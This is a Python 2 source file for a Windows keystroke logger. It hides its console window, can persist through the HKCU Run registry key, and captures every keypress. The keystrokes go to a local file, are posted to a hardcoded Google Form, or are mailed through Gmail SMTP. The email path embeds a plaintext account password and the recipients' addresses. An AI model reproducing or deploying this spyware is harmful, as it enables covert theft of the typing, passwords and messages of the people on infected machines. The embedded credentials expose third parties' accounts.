'''
Keystroke Logger for Windows using Python
====================================

FEATURES
========
1.STORE LOGS LOCALLY
2.SEND LOGS TO GOOGLE FORMS
3.SEND LOGS TO EMAIL

'''
try:
    import pythoncom, pyHook
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import os
import sys
import threading
import urllib,urllib2
import smtplib
import datetime,time
import win32event, win32api, winerror
from _winreg import *

inst_X = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    inst_X = None
    print "Please end the previous session. Multiple instances are forbidden"
    exit(0)
flag=''
key_msg=''
count=0



def hidden():
    import win32console,win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)
    return True

def display():
    print """\n \n
Available modes:
    > local: A local file [logs.txt] of captured keystrokes will be created.
     
    > remote: Captured keystrokes will be sent to a Google Form. 
     
    > email: Captured keystrokes will be sent to a designated Email Id.
     
 startup: The script will run in the background even after startup.\n\n"""
    return True


def startup():
    fp=os.path.dirname(os.path.realpath(__file__))
    file_name=sys.argv[0].split("\\")[-1]
    new_file_path=fp+"\\"+file_name
    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'

    key2change= OpenKey(HKEY_CURRENT_USER,
    keyVal,0,KEY_ALL_ACCESS)

    SetValueEx(key2change, "Keystroke Logger",0,REG_SZ, new_file_path)


def localLog():
    global key_msg
    if len(key_msg)>10:
        fp=open("logs.txt","a")
        fp.write(key_msg)
        fp.close()
        key_msg=''
    return True


def remoteLog():
    global key_msg
    if len(key_msg)>10:
        url="https://docs.google.com/forms/d/e/1FAIpQLSdEBLBT-emVld2bT14HCzyeIojO86--ySG8J2Vo54XbSWiAmg/formResponse" 
        klog={'entry.1778892875':key_msg} 
        try:
            msgencode=urllib.urlencode(klog)
            req=urllib2.Request(url,msgencode)
            response=urllib2.urlopen(req)
            key_msg=''
        except Exception as e:
            print e
    return True


class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global key_msg
            if len(key_msg)>10:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com" 
                PORT = 587 
                USER="nwsec.209@gmail.com" 
                PASS="networksecurity"
                FROM = USER 
                TO = ["akshaymyname@gmail.com","nwsec.209@gmail.com"] 
                SUBJECT = "Captured Keystroke: "+str(ts)
                MESSAGE = key_msg
                message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    key_msg=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)

def main():
    global flag
    if len(sys.argv)==1:
        display()
        exit(0)
    else:
        if len(sys.argv)>2:
            if sys.argv[2]=="startup":
                startup() 
            else:
                display()
                exit(0)
        if sys.argv[1]=="local":
            flag=1
            hidden()
        elif sys.argv[1]=="remote":
            flag=2
            hidden()
        elif sys.argv[1]=="email":
            hidden()
            email=TimerClass()
            email.start()
        else:
            display()
            exit(0)
    return True

if __name__ == '__main__':
    main()

def keypressed(event):
    global flag,key_msg
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    key_msg=key_msg+keys 
    if flag==1:  
        localLog()
    elif flag==2:
        remoteLog()
   

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()